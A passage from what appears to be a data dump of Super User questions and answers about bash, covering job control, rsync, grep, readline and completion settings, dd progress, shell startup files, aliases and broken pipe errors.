<p>Either save the code as a shell script file and <a href=""http://mywiki.wooledge.org/BashGuide/Sourcing"" rel=""noreferrer"">source</a> that in, or copy the function wholesale into, <code>.bashrc</code> (or your <a href=""http://mywiki.wooledge.org/DotFiles"" rel=""noreferrer"">pertinent dot file</a>). The important thing is to call the function <strong>after both bash completion and alias definitions have been set up</strong> (the code above calls the function right after its definition, in a “source and forget” spirit, but you can move the call anywhere downstream if that suits you better). If you don’t want the function in your environment after it exits, you can add <code>unset -f alias_completion</code> after calling it.</p>

<h2>Notes</h2>

<p>If you are using <code>bash</code> 4.1 or above and use dynamically-loaded completions, the script will attempt to load completions for all of your aliased commands so that it can build the wrapper functions for your aliases.</p>
"
"What do those +/- mean if linux job in background finishes (started with &)","559211","<linux><bash>","49","<p>From <code>man bash</code>:</p>

<blockquote>
  <p>In output pertaining to jobs (e.g., the output of the <code>jobs</code> command), the current job is always flagged with a <code>+</code>, and the previous job with a <code>-</code>.</p>
</blockquote>

<p>That is, the job flagged with a <code>+</code> is the one that was sent to the background last. </p>

<p>It is also the one that will be brought into the foreground when <code>fg</code> is used without arguments:</p>

<pre><code>$ /tmp/script &amp;
[1] 9871
$ /tmp/script2 &amp;
[2] 9876
$ /tmp/script3 &amp;
[3] 9881
$ /tmp/script4 &amp;
[4] 9886
$ jobs
[1]   Running                 /tmp/script &amp;
[2]   Running                 /tmp/script2 &amp;
[3]-  Running                 /tmp/script3 &amp;
[4]+  Running                 /tmp/script4 &amp;
$ fg
/tmp/script4
</code></pre>

<p>The job flagged with a <code>-</code> was sent to the background second last. Other background jobs are not flagged.</p>
"
"Does rsync delete files, folders at destination by default?","730654","<macos><bash><unix><rsync>","49","<p>By default, rsync does not delete files but that depends on the commands options you specify. You can use any the following if you WANT to delete files:</p>

<ul>
<li>−−del (alias for −−delete−during)</li>
<li>−−delete (deletes extraneous files from dest dirs)</li>
<li>−−delete−before (receiver deletes before xfer [default])</li>
<li>−−delete−during (receiver deletes during xfer, not before)</li>
<li>−−delete−after (receiver deletes after xfer, not before) </li>
<li>−−delete−excluded (also delete excluded files from dest dirs) </li>
<li>−−max−delete=NUM (don’t delete more than NUM files)</li>
</ul>

<p>Since you specifically called out the <strong>-a</strong> option, here's what the man page says</p>

<blockquote>
  <p><strong><em>−a, −−archive</em></strong>
  ></p>
  
  <blockquote>
    <p>This is equivalent to <strong>−rlptgoD</strong>. It is a quick way of saying you want recursion and want to preserve almost everything (with −H being a notable omission). The only exception to the above equivalence is when <strong>−−files−from</strong> is specified, in which case −r is not implied.</p>
    
    <p>Note that <strong>−a does not preserve hardlinks</strong>, because finding multiply-linked files is expensive. You must separately specify <strong>−H</strong>.</p>
  </blockquote>
</blockquote>

<p>So it seems the answer to your question is NO, it won't be deleted given your examples.<br>
HTH</p>
"
"How can I prepend a line number and tab to each line of a text file?","10201","<unix><bash>","49","<pre><code>awk '{printf ""%d\t%s\n"", NR, $0}' &lt; filename
</code></pre>
"
"I want to change DPI with ImageMagick without changing the actual byte-size of the image data","479197","<linux><bash><image-processing><imagemagick><gimp>","48","<p>Specify the units - I seem to remember having a problem when I omitted this option (although DPI should be the default), for example:</p>

<pre><code>convert -units PixelsPerInch input.png -density 300 output.png
</code></pre>

<p>Do you know which embedded data fields GIMP uses to read the resolution - does it have its own that override the standard ones used by ImageMagick? For example, Photoshop uses <code>Photoshop:XResolution</code> and <code>Photoshop:YResolution</code> so you have to set these for Photoshop to recognise a density setting (ImageMagick can’t do this - we use ExifTool).</p>
"
"What does this strange symbol "":>"" in bash mean","965870","<bash>","48","<h3>There was :> in a line of a bash script. What does it mean?</h3>

<pre><code>:&gt; file
</code></pre>

<p>It is a short cut way of saying:</p>

<ul>
<li>If <code>file</code> does not exist then create it else truncate it to <code>0</code> bytes.</li>
</ul>

<p>This means you can be sure that <code>file</code> exists and it is empty.</p>

<p>You can also use <code>&gt; file</code> but <code>:&gt; file</code> is more portable.</p>

<p>See the Stack Overflow question <a href=""https://stackoverflow.com/questions/3224878/what-is-the-purpose-of-the-colon-gnu-bash-builtin"">What Is the Purpose of the ':' (colon) GNU Bash Builtin?</a> for more information.</p>
"
"How can I ""grep"" recursively filtering the name of the files I want with wildcards?","757834","<linux><command-line><bash><grep><file-filter>","48","<p>Use <code>grep</code>'s <code>--include</code> option:</p>

<pre><code>grep -ir ""string"" --include=""*.php"" .
</code></pre>
"
"Killing all instances of Chrome on the command-line?","131019","<linux><google-chrome><bash>","47","<p>Try using <strong><a href=""http://linux.die.net/man/1/pkill"">pkill(1)</a></strong>.</p>

<p><code>pkill chrome</code></p>
"
"Have a file named ~ (tilde) in my home-directory","609362","<linux><bash><filesystems>","47","<p>The pretty much ultimate solution when it comes to files that can't be deleted by normal means:</p>

<pre><code>ls -il 
</code></pre>

<p>The first column will show the inode number of the files.</p>

<pre><code>find . -inum [inode-number] -exec rm -i {} \;
</code></pre>

<p>This will delete the file with the specified inode-number after verification.</p>
"
"Bash completion for commands in Mac OS X","288438","<macos><command-line><bash><macports><fink>","46","<p><a href=""http://bash-completion.alioth.debian.org"" rel=""noreferrer"">bash-completion</a> adds completion for:</p>

<ul>
<li>Command names after <code>sudo</code> and <code>which</code></li>
<li>Macports and Homebrew package names (optional)</li>
<li>Hostnames in <code>known_hosts</code> for commands like <code>ssh</code></li>
<li>Folders on <code>CDPATH</code></li>
</ul>

<p>And so on. You can print a list of completion commands with <code>complete -p</code> and see the source of a function with <code>declare -f</code>.</p>

<h3>Installing Homebrew or MacPorts and Bash</h3>

<p>First, you have to install <a href=""http://brew.sh/"" rel=""noreferrer"">Homebrew</a> or <a href=""https://www.macports.org/"" rel=""noreferrer"">MacPorts</a> according to the instructions. <strong>Note:</strong> Do not install both, as they conflict.</p>

<p>Then, install a newer version of Bash. The built-in Bash in OS X is a little old, and you'll get more completion options with Bash > 4.1, which you can get through</p>

<pre><code>brew install bash
</code></pre>

<p>or</p>

<pre><code>sudo port install bash
</code></pre>

<p>depending on whether you use Homebrew or MacPorts.</p>

<h3>Installing bash-completion with Homebrew</h3>

<p>To install <code>bash-completion</code>, you have to:</p>

<pre><code>brew install bash-completion
</code></pre>

<p>And add the following to your <code>~/.bash_profile</code>:</p>

<pre class=""lang-bsh prettyprint-override""><code>if [ -f $(brew --prefix)/etc/bash_completion ]; then
  . $(brew --prefix)/etc/bash_completion
fi
</code></pre>

<p>Homebrew currently installs an older version of bash-completion (1.3) that still works with Bash 3.x, but still, using Bash 4.x is recommended.</p>

<h3>Installing bash-completion with MacPorts</h3>

<p>With MacPorts:</p>

<pre><code>sudo port install bash-completion
</code></pre>

<p>Then, add to your <code>~/.bash_profile</code>:</p>

<pre><code>if [ -f /opt/local/etc/profile.d/bash_completion.sh ]; then
  . /opt/local/etc/profile.d/bash_completion.sh
fi
</code></pre>

<p>See <a href=""http://trac.macports.org/wiki/howto/bash-completion"" rel=""noreferrer"">trac.macports.org/wiki/howto/bash-completion</a> for instructions on how to enable completion for port names.</p>
"
"Bash autocomplete on symlink to directory complete to whole directory, including slash","271626","<bash><autocomplete>","46","<p>Enable the <code>mark-symlinked-directories</code> option for <em>readline</em>.</p>

<ol>
<li><p>Edit <code>~/.inputrc</code>:</p>

<pre><code>$include /etc/inputrc
set mark-symlinked-directories on
</code></pre></li>
<li><p>Press <kbd>C-x</kbd>, <kbd>C-r</kbd> to reload the settings.</p></li>
</ol>

<p>See section <em>READLINE</em> in the manual page of <code>bash</code> for further documentation.</p>

<p>For those who do not wish to add another dot file, you can also add this line to your <code>~/.bashrc</code>:</p>

<pre><code>bind 'set mark-symlinked-directories on'
</code></pre>
"
"Can't rename a file the name of which starts with a hyphen","510337","<linux><command-line><bash><shell>","46","<p>Most GNU/Linux commands allow a <code>--</code> option to indicate end of options so that subsequent <code>-</code> prefixed words are not treated as options.</p>

<pre><code>  mv -- -example-file-name example-file-name
</code></pre>

<p>A small test</p>

<pre><code>$ touch -- -example
$ ls -l -- *ample
-rw-r--r-- 1 rgb rgb 0 Nov 25 09:57 -example
$ mv -- -example example
$
</code></pre>
"
"echo text with new line in bash","154936","<linux><bash>","45","<p>option 1:</p>

<pre><code>% echo -e ""text\n"" &gt;&gt; file.conf
</code></pre>

<p>option 2:</p>

<pre><code>% ( echo text ; echo """" ) &gt;&gt; file.conf
</code></pre>

<p>option 3:</p>

<pre><code>% echo text &gt;&gt; file.conf
% echo """"  &gt;&gt; file.conf
</code></pre>
"
"how to get elements from list in bash?","121627","<linux><bash>","45","<p>no spaces between equal sign</p>

<pre><code>$ List=""abcd 1234 jvm something""
$ set -- $List
$ echo $2
1234
</code></pre>

<p>Some other ways, although not as efficient as using shell's internals</p>

<pre><code>$ echo $List | cut -d"" "" -f2
1234
$  echo $List | awk '{print $2}'
1234
$ echo $List | sed 's/^.[^ \t]* //;s/ .*//'
1234
$ echo $List | tr "" "" ""\n""|sed -n '2p'
1234
</code></pre>
"
"Bash vs. Gnu screen : Replace Ctrl-A with Ctrl-Shift-A","142680","<bash><gnu-screen><readline>","45","<p>The problem with <kbd>Control</kbd>-<kbd>Shift</kbd>-<kbd>A</kbd> is that most terminal emulation programs do not send a different code for it from the one sent by <kbd>Control</kbd>-<kbd>A</kbd>, so there would be no way for <em>screen</em> to tell the difference.</p>

<p>You might be able to use C-q if you do <code>stty -ixon</code> to disable “software flow control” on the tty. I usually do this so I can use C-s to search on the command line.</p>

<p>You might consider C-^, since it seems to be usually unbound. It is <kbd>Control</kbd>-<kbd>Shift</kbd>-<kbd>6</kbd> on US keyboard layouts, but it may be difficult to type on other layouts.</p>

<p>Most people never use the tty control character C-\ to send SIGQUIT. To use it, disable the tty functionality with with <code>stty quit undef</code> and bind it as your prefix key. This is a bit risky though, since if you hit C-\ on a tty where the quit key has not been disabled with <em>stty</em>, you might kill the foreground process instead of activating <em>screen</em>.</p>

<p>I switched to <a href=""http://tmux.sourceforge.net/"" rel=""nofollow noreferrer""><em>tmux</em></a> a while ago. Its default is C-b <a href=""http://sourceforge.net/mailarchive/message.php?msg_name=20100429195120.GA17144%40yelena.nicm.ath.cx"" rel=""nofollow noreferrer"">because it was developed under <em>screen</em> and did not interfere with <em>screen</em>'s default</a>. I have found that C-b works fairly well for me (I usually use the arrow keys for single character movement on the shell command line—though I use M-b and M-f to move by words).</p>

<p>Incidentally, the author of <em>tmux</em> uses C-a in his primary sessions and <a href=""http://sourceforge.net/mailarchive/message.php?msg_name=20100429201207.GD15766%40yelena.nicm.ath.cx"" rel=""nofollow noreferrer"">always types C-a twice</a> (whether in a <em>tmux</em> session or not). If you are willing to adopt this habit, it seems like a decent compromise since the second C-a should be a no-op in most Emacs-like editing contexts. It would not work so will if you often use programs/contexts outside of <em>screen</em> where the second C-a would not be a no-op.</p>

<p>By default, C-a C-a is bound to the <em>other</em> command (switch to most recently active screen) in <em>screen</em>. To have C-a C-a send an actual C-a and have C-a o switch windows, put the following in your <code>.screenrc</code>:</p>

<pre><code>escape ^A^A
bind o other
</code></pre>
"
"How to quickly change the first word in a Bash command?","867904","<linux><command-line><bash><shell>","45","<p><code>!$</code> expands to the last word of your previous command.</p>

<p>So you could do:</p>

<pre><code>cat foo/is/a/very/long/path/to/bar.c

rm !$
</code></pre>

<p>or:</p>

<pre><code>git diff foo/bar.c

git checkout !$
</code></pre>

<p>Your examples happened to only repeat the last word, so <code>!$</code> worked fine. If you actually had a lot of arguments that you wanted to repeat, and you just wanted to change the first word, you could use <code>!*</code>, which expands to all words of the previous command except the zeroth. </p>

<p>See the ""HISTORY EXPANSION"" section of the <code>bash</code> man page. There's a lot of flexibility there.</p>
"
"Finding the definition of a bash function","144772","<bash><shell>","44","<p>To get the function definition:</p>

<pre><code>type -a function_name
</code></pre>
"
"The command 'ls -d' is not displaying directories. Is there a way to get 'ls' to only display directories instead of files and directories?","344877","<linux><bash><ls>","44","<p>Your expectations are based upon DOS Think/Windows Think and are wrong.  On MS-DOS, Windows, and indeed a few other IBM/Microsoft operating systems, wildcard expansion is done by the command itself, and things like the <code>/a</code> option to the <code>dir</code> command act as attribute filters during wildcard expansion.  <code>dir</code> expands wildcards like <code>*</code>, which the command interpreter passes to it as-is, and if <code>/a</code> is specified it applies the appropriate filters to what is returned.  (On some operating systems, the attribute filters can be given to the system call for enumerating a directory and the operating system kernel, or its filesystem drivers, applies them itself.)</p>

<p>On Unices and on Linux, wildcard expansion is done by the shell, and is oblivious to permissions.  When, in the root directory, you do <pre>ls *</pre><p>what the <code>ls</code> command itself <em>receives</em> from the shell is (something like) <pre>ls bin home opt var boot dev tmp etc lost+found root usr</pre><p>What the <code>-d</code>/<code>--directory</code> option does is <em>turn off what normally happens next</em>.  What normally happens next is that <code>ls</code> looks at each of its arguments in turn, sees that they are directories, and decides to enumerate their contents.  For arguments that name files, it just prints out the information for the file itself.  With the <code>-d</code> option, directories are treated just like files.  So <code>ls</code> prints out the information for each of the directories that is passed as its arguments, just as it would do if they were files.</p>

<p>So <code>-d</code> <strong>is not</strong> a ""print only directories"" option.  In fact, not only is there no such option; there <em>cannot be</em> such an option.  Wildcard expansion is done by the shell, and (in a POSIX <code>sh</code> at least) there's no way to tell the shell to check permission and file type bits when it expands <code>*</code> into a list of names.  To obtain a list of the names of directories alone, it is necessary either to use the <code>find</code> command, as explained by <code>ztank1013</code>, or to use the trick that a pathname ending with a slash implies the directory entry <code>.</code>, as explained by <code>Jin</code>.  (<code>Jin</code>'s trick ends up with the <code>ls</code> command receiving the arguments  <pre>ls bin/ home/ opt/ var/ boot/ dev/ tmp/ etc/ lost+found/ root/ usr/</pre><p>because the pattern <code>*/</code> is in fact matching pathnames with two components, the second being empty, and so isn't <em>quite</em> doing what was desired.  In particular, it will treat symbolic links pointing to directories as if they were directories.)</p>

<p>The behaviour of <code>ls -d</code> without a <code>*</code> is a simple extension of the above.  One simply has to know one more thing about <code>ls</code>: When it is given no arguments, it assumes a default argument of <code>.</code>.  Now <em>without</em> the <code>-d</code> option, the aforementioned behaviour leads to the contents of the directory named by <code>.</code> being enumerated and the information for its contents displayed.  <em>With</em> the <code>-d</code> option, the directory <code>.</code> is treated just as if it were a file, and its own information is displayed, rather than its contents enumerated.</p>
"
"How to disable set -e for an individual command?","940498","<bash>","44","<p>If the the ""exit immediately shell option"" applies or is ignored depends on the context of the executed command (see <a href=""https://www.gnu.org/software/bash/manual/bashref.html#The-Set-Builtin"" rel=""noreferrer"">Bash Reference Manual section on the Set Builtin</a> - thanks to Arkadiusz Drabczyk).</p>

<p>Especially, the option is ignored if a command is part of the test in an if statement. Therefore it is possible to execute a command and check for its success or failure within an ""exit immediately context"" using an if statement like this:</p>

<pre><code>#!/bin/bash

set -e

# Uncomment next line to see set -e effect:
#blubb

if blubb; then
  echo ""Command blubb was succesful.""
else 
  echo ""Command blubb failed. Exit code: $?""
fi
echo ""Script exited normally.""
</code></pre>

<p>It is possible to omit the ""then"" statement and use fewer lines:</p>

<pre><code>if blubb; then :;
else echo ""Command blubb failed. Exit code: $?""; fi
</code></pre>
"
"How do I configure ConEmu to run Cygwin Bash?","591206","<windows-7><bash><cygwin><conemu>","43","<p>This might helps others.</p>

<p>It looks like version 140310 of ConEmu automatically detects CygWin Bash.</p>

<p>If you've installed Cygwin after you installed ConEmu, you'll need to <strong>Reload...</strong> your list of Tasks.</p>

<ol>
<li>Go to <strong>Settings... (Win + Alt + P)</strong></li>
<li>Navigate to your list of <strong>Tasks (Startup > Tasks)</strong></li>
<li>Click on the <strong>Reload...</strong> button.</li>
</ol>

<p>You should now see <strong>{CygWin bash}</strong> as one of your options in the list of predefined tasks:</p>

<p><img src=""https://i.stack.imgur.com/p41qW.png"" alt=""Screenshot of CygWin bash in ConEmu""></p>

<p><em>PS -- If this method doesn't work, try resetting your ConEmu settings (click the <strong>Reset...</strong> button at the bottom of your <strong>Settings</strong> window).</em></p>
"
"How do you change the color scheme in bash on Ubuntu for Windows?","1114549","<ubuntu><command-line><bash><windows-10-v1607><windows-subsystem-for-linux>","43","<p>The problem is not specific to bash on Ubuntu for Windows, as the terminal is still provided by <code>conhost.exe</code>.</p>

<p>To change the colors, you can go into the <strong>Defaults</strong>:</p>

<p><a href=""https://i.stack.imgur.com/kOGNh.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/kOGNh.png"" alt=""enter image description here""></a></p>

<p>And then you can click each individual color and change it to some other color.</p>

<p><a href=""https://i.stack.imgur.com/tfszW.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/tfszW.png"" alt=""enter image description here""></a></p>

<p>The process is somewhat confusing, because by clicking a color rectangle, you're changing what is selected as the <strong>Screen Background</strong>. So you first have to change that selection, adjust the color and then change the selection back to your desired background color.</p>

<p>Overall, it is easier to just go with a different terminal or console emulator altogether. I personally use <a href=""https://conemu.github.io/"" rel=""noreferrer"">ConEmu</a> now, which allows you to change color schemes much easier.</p>
"
"How can I list only non-empty files using ls?","191889","<linux><command-line><bash><shell><ls>","43","<p>I'd use <code>find dirname -not -empty -ls</code>, assuming GNU find.</p>
"
"Is there a method of getting a percentage on a DD in linux?","1290499","<linux><command-line><bash><backup><dd>","42","<p>See answers from this question <sup>[<a href=""https://askubuntu.com/q/215505/196535"">1</a>]</sup></p>
<h3><code>pv</code></h3>
<p>For example you can use <code>pv</code> <strong>before you start</strong></p>
<pre><code>sudo apt-get install pv    # if you do not have it
pv &lt; /dev/sda &gt; /dev/sc3   # it is reported to be faster
pv /dev/sda &gt; /dev/sc3     # it seems to have the same speed of the previous one
#or 
sudo dd if=/dev/sda | pv -s 1844G | dd of=/dev/sdc3  # Maybe slower 
</code></pre>
<p>Output <sup>[<a href=""https://askubuntu.com/a/215590/196535"">2</a>]</sup>:</p>
<pre><code>440MB 0:00:38 [11.6MB/s] [======&gt;                             ] 21% ETA 0:02:19
</code></pre>
<p><sup><strong>Notes:</strong><br />
Especially for large files you may want to see <code>man dd</code> and set the options needed to speed up all on your hardware, e.g. <code>bs=100M</code> to set the buffer, <code>oflag=sync</code> to count the effective bytes written, maybe <code>direct</code>...<br />
The option <code>-s</code> only takes integer parameters so <code>1.8T--&gt;1844G</code>.<br />
As you can notice from the first lines you do not need <code>dd</code> at all.
</sup></p>
<hr />
<h3><code>kill -USR1 pid</code></h3>
<p>If you <strong>already launched</strong> the <code>dd</code> command, once you have individuated its PID (<kbd>Ctrl</kbd>-<kbd>Z</kbd> +<code>bg</code> and you read it , or <code>pgrep ^dd</code> ... ) you may send a signal <code>USR1</code> (or <code>SIGUSR1</code>, or <code>SIGINFO</code> see below) and read the output.<br />
If the PID of the program is 1234 with</p>
<pre><code>kill -USR1 1234
</code></pre>
<p><code>dd</code> will answer on the terminal of its STDERR with something similar to</p>
<pre><code>4+1 records in
4+0 records out
41943040 bytes (42 MB) copied, 2.90588 s, 14.4 MB/s
</code></pre>
<p><sup><strong>Warning:</strong> Under OpenBSD you may have to check in advance the behaviour of <code>kill</code><sup>[<a href=""https://man.openbsd.org/sigaction.2"" rel=""noreferrer"">3</a>]</sup>: use instead<br />
<code>kill -SIGINFO 1234</code>.<br />
It exists the sigaction named <code>SIGINFO</code>. The<code>SIGUSR1</code> one, in this case, should <strong>terminate</strong> the program (<code>dd</code>)...<br />
Under Ubuntu use <code>-SIGUSR1</code> (<code>10</code>).<br />
</sup></p>
"
"Make bash's tab-completion case-insensitive","271530","<bash><tab-completion>","42","<p>Create a file named <code>.inputrc</code> in your home directory, and place this line in it:</p>

<pre><code>set completion-ignore-case on
</code></pre>

<p>Then open a new shell and try it out. If /etc/inputrc exists on your system, you should generally also add the line <code>$include /etc/inputrc</code>. But there's no way to make this conditional, so you should only add it if that file exists.</p>
"
"Environment variables in bash_profile or bashrc?","409186","<bash><path><environment-variables><bashrc><.bash-profile>","41","<p>On a modern system it is not especially common to run into the cases where it matters, but it does happen.  (In particular, if you use shell operations in <code>vim</code> such as <code>:r !command</code> or the in-line <code>!&lt;motion&gt;command</code> form.)</p>

<blockquote>
  <p>What would you put under ~/.bashrc? only aliases?</p>
</blockquote>

<p>You put things in <code>~/.bashrc</code> that would not be inherited by subshells automatically; this means aliases and functions, mostly, although sometimes you have variable settings that you don't want visible outside the shell (this is very rare).  It could be argued that those should be exported somehow, but various experimental attempts have run into compatibility issues with trying to hide them within the environment and have mostly been abandoned.</p>

<blockquote>
  <p>If I want to set an environment variable and add it to the PATH (for example JAVA_HOME) where it would be the best place to put the export entry? in ~/.bash_profile or ~/.bashrc?</p>
</blockquote>

<p>You put environment settings in <code>~/.bash_profile</code> so that they are given sane initial settings.  Sometimes you will want to override these (often this is done by complex environments such as Matlab or Cadence); if you put the environment settings in <code>~/.bashrc</code> then shells run from within those environments will lose the environments' customizations, and things may not work properly as a result.  This also applies if you use a package like <a href=""http://modules.sourceforge.net"">modules</a>, <a href=""http://pypi.python.org/pypi/virtualenv"">virtualenv</a>, <a href=""http://beginrescueend.com/"">rvm</a>, etc. to manage multiple development environments; putting your settings in <code>~/.bashrc</code> means you can't run the environment you want from within your editor, but instead will be forced into the system default.</p>

<blockquote>
  <p>In a non-login shell, I believe the ~/.bash_profile is not being ""picked up"".</p>
</blockquote>

<p>This is correct; you normally want the initial shell to be a login shell and any shells started under that one to <em>not</em> be login shells.  If the initial shell is not a login shell, you won't have a default <code>PATH</code> or various other settings (including your <code>JAVA_HOME</code> example).</p>

<p>Most desktop environments launched from display managers (which is to say, the vast majority of graphical logins) do not set up a login environment for the entire desktop, so you are forced to run the initial shell in terminals as a login shell.  This causes a number of problems (notably that the <code>PATH</code> and such available to programs run from e.g. panels is not set up properly, because the panel is not a terminal and has not run <code>~/.bash_profile</code>), but is a reasonable compromise given that it is not always possible to sanely run <code>~/.bash_profile</code> in the non-interactive environment at the beginning of a session started by a display manager, depending on its contents.  It is sometimes suggested to place environment settings in <code>~/.bashrc</code> instead of configuring a login shell instead; as discussed above, this works as long as you do not need to override that environment, and causes odd breakages once you <em>do</em> need to do so.</p>

<p>I recently helped diagnose an issue like this on OS X where a user who had placed settings in <code>~/.bashrc</code> then later started using <code>rvm</code> and <a href=""http://perlbrew.pl"">perlbrew</a> saw odd behavior, because the environments set up by the two were ""undone"" by <code>~/.bashrc</code> inside editors and <code>sudo</code> (which on OS X, unlike Linux, propagates the user's <code>$HOME</code> so that their <code>~/.bashrc</code> was run by the root shell).  Before trying to use those environments, there was no problem; on starting to use them, they were bewildered by the unexpected loss of their settings.</p>
"
"How to find the largest directories or largest files?","276487","<linux><bash><filesystems>","41","<p>From any directory:</p>

<p><code>du -a | sort -n -r</code></p>
"
"How can I make my own ""shell commands"" (e.g. mkdir/cd combo)?","1073869","<bash>","41","<p>The simplest way is to use a shell function:</p>

<pre><code>mkcd() {
    mkdir -p -- ""$1"" &amp;&amp; cd -- ""$1""
}
</code></pre>

<p>Place it in your <code>.bashrc</code> file to make it be available to you just like another shell command.</p>

<p>The reason why it doesn't work as an external script is <code>cd</code> changes the current directory of the running script but doesn't affect the calling one. This is by design! Each process has its own working directory which is inherited by its children, but the opposite is not possible.</p>

<p>Unless part of a pipeline, run in the background or explicitly in a subshell, a shell function doesn't run in a separate process but in the same one, just like if the command has been sourced. The current directory shell can then be changed by a function.</p>

<p>The <code>&amp;&amp;</code> used here to separate both commands used means, if the first command succeeds (<code>mkdir</code>), run the second one (<code>cd</code>). Consequently, if <code>mkdir</code> fails to create the requested directory, there is no point trying to go into it. An error message is printed by <code>mkdir</code> and that's it.</p>

<p>The <code>-p</code> option used with <code>mkdir</code> is there to tell this utility to create any missing directory that is part of the full path of the directory name passed as argument. One side effect is that if you ask to create an already existing directory, the <code>mkcd</code> function won't fail and you'll end up in that directory. That might be considered an issue or a feature. In the former case, the function can be modified for example that way which simply warns the user:</p>

<pre><code>mkcd() {
    if [ -d ""$1"" ]; then
        printf ""mkcd: warning, \""%s\"" already exists\n"" ""$1""
    else
        mkdir -p ""$1"" 
    fi &amp;&amp; cd ""$1""
}
</code></pre>

<p>Without the <code>-p</code> option, the behavior of the initial function would have been very different.</p>

<p>If the directory containing the directory to create doesn't already exists, <code>mkdir</code> fails an so does the function.</p>

<p>If the directory to be create already exists, <code>mkdir</code> fails too and <code>cd</code> isn't called.</p>

<p>Finally, note that setting/exporting <code>PWD</code> is pointless, as the shell already does it internally.</p>

<p>Edit: I added the <code>--</code> option to both commands for the function to allow a directory name starting with a dash.</p>
"
"In bash, how can I rename a file without repeating the path?","298081","<bash><rename><mv>","40","<p>Using bash <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Event-Designators"">history expansion</a>:</p>

<pre><code>mv path/to/oldfile !#:1:h/newfile
</code></pre>

<p>where <code>!#:1:h</code> means: from the line you're currently typing (""!#""), take the first word ("":1""), then take only the path component ("":h"" -- the head) from it.</p>
"
"Command: sudo su -","105367","<unix><bash><sudo><su>","40","<p>In addition to what you said, <code>su</code> requires the root password and <code>sudo</code> requires your user password</p>

<p>Therefore <code>sudo su -</code> will put you into a root environment but it will ask you for your user password instead of the root password (once sudo has given you root privileges, <code>su -</code> can be executed with no password). </p>
"
"Can ',,' be aliased to '..'?","1204017","<linux><bash><shell>","40","<h3>ZSH:</h3>
<p>If you'r using <code>zsh</code> <code>alias -g ,,=&quot;..&quot;</code> is what you need, but this will cause &quot;,,&quot; to be expanded everywhere, not only when used with <code>cd</code>.</p>
<p>From <code>man zshbuiltins</code>:</p>
<blockquote>
<p>If  the  <code>-g</code>  flag  is  present, define a global alias; global aliases are expanded even if they do not occur in command position.</p>
</blockquote>
<h3>BASH:</h3>
<p>If restricted to <code>bash</code> (as the question is tagged with <a href=""/questions/tagged/bash"" class=""post-tag"" title=""show questions tagged &#39;bash&#39;"" rel=""tag"">bash</a>), read the following:</p>
<p>This is a pure-alias solution, as requested, <strong>however</strong> this will do more than required possibly frustrating the user (see the warning at the end of my post).</p>
<p>Quoting <code>man bash</code>:</p>
<blockquote>
<p>If the last character of the alias value is a blank, then the next command word following the alias is also checked for alias expansion.</p>
</blockquote>
<p>Therefore it's enough to alias <code>cd</code> with an extra space (to allow expanding of its next argument) and then alias <code>,,</code> to <code>..</code>. See that</p>
<pre><code>alias cd='cd '
alias ,,='..'
</code></pre>
<p>gives exactly what you need.</p>
<p>Note that this is correct not only for <code>bash</code> (and its <code>alias</code> implementation), but all POSIX-compilant shells. Quoting an example from <code>man 1p alias</code> (the manual does not describe this feature explicitly, only through an example):</p>
<blockquote>
<ol start=""4"">
<li><p>Set up nohup so that it can deal with an argument that is itself an alias name:</p>
<pre><code>       alias nohup=&quot;nohup &quot;
</code></pre>
</li>
</ol>
</blockquote>
<p><strong>Warning:</strong>
As @PeterCordes writes in his comment, it will automatically cause <em>other</em> aliases to expand when written after <code>cd</code>. It may require you to write <code>cd \grep</code> if you want to change directory to one named <code>grep</code> but your <code>grep</code> is an alias for <code>grep --color=auto</code>. Without the backslash, <code>cd</code> will report &quot;too many arguments&quot; error (you can't <code>cd</code> to two directories at once)!.</p>
"
"Copy all files matching pattern from dir and subdirs into a single dir","312348","<linux><bash>","40","<p>Try:</p>

<pre><code>find src/ -type f | grep -i so$ | xargs -i cp {} dst
</code></pre>
"
"Equivalent/Alternatives for Alt+Dot in Mac","84998","<linux><mac><bash><terminal><shell>","40","<p>You can press Esc-dot many times, it does the same things are alt-dot.
But, like you, i find it more cumbersome to type to type than alt-dot.</p>
"
"How can I fix a Broken Pipe error?","554855","<bash><ruby><.bash-profile><rvm>","40","<p>Seeing ""Broken pipe"" in this situation is rare, but normal. </p>

<p>When you run <code>type rvm | head -1</code>, bash executes <code>type rvm</code> in one process, <code>head -1</code> in another.<sup>1</sup> The stdout of <code>type</code> is connected to the ""write"" end of a <em>pipe</em>, the stdin of <code>head</code> to the ""read"" end. Both processes run at the same time.</p>

<p>The <code>head -1</code> process reads data from stdin (usually in chunks of 8 kB), prints out a single line (according to the <code>-1</code> option), and exits, causing the ""read"" end of the pipe to be closed. Since the <code>rvm</code> function is quite long (around 11 kB after being parsed and reconstructed by bash), this means that <code>head</code> exits while <code>type</code> still has a few kB of data to write out.</p>

<p>At this point, since <code>type</code> is trying to write to a pipe whose other end has been closed – a <em>broken</em> pipe – the write() function it caled will return an EPIPE error, translated as ""Broken pipe"". In addition to this error, the kernel also sends the SIGPIPE signal to <code>type</code>, which by default kills the process immediately.</p>

<p>(The signal is very useful in interactive shells, since most users do not want the first process to keep running and trying to write to nowhere. Meanwhile, non-interactive services ignore SIGPIPE – it would not be good for a long-running daemon to die on such a simple error – so they find the error code very useful.)</p>

<p>However, signal delivery is not 100% immediate, and there may be cases where write() returns EPIPE and the process continues to run for a short while before receiving the signal. In this case, <code>type</code> gets enough time to notice the failed write, translate the error code and even print an error message to stderr before being killed by SIGPIPE. (The error message says ""-bash: type:"" since <code>type</code> is a built-in command of bash itself.)</p>

<p>This seems to be more common on multi-CPU systems, since the <code>type</code> process and the kernel's signal delivery code can run on different cores, literally at the same time.</p>

<p>It would be possible to remove this message by patching the <code>type</code> builtin (in bash's source code) to immediately exit when it receives an EPIPE from the write() function.</p>

<p>However, it's nothing to be concerned about, and it is not related to your <code>rvm</code> installation in any way.</p>


"
"Change Terminal Title in Mac OS X","105499","<macos><bash>","40","<p>This <a href=""http://www.tech-recipes.com/rx/705/mac-os-x-change-the-terminal-window-title/"" rel=""noreferrer"">article</a> tells you how.</p>

<p>Essentially, you use character sequences echoed to the screen to inform the terminal of what title it should display.</p>

<pre><code>title='My first title'
echo -n -e ""\033]0;$title\007""
</code></pre>

<p>In the above example, whatever the variable title is set to while become the terminal's title. Of course, you could just have the title in the string to echo such as:</p>

<pre><code>echo -n -e ""\033]0;My first title\007""
</code></pre>

<p>But the first way makes it a slightly bit easier to use and/or extend later.</p>
"
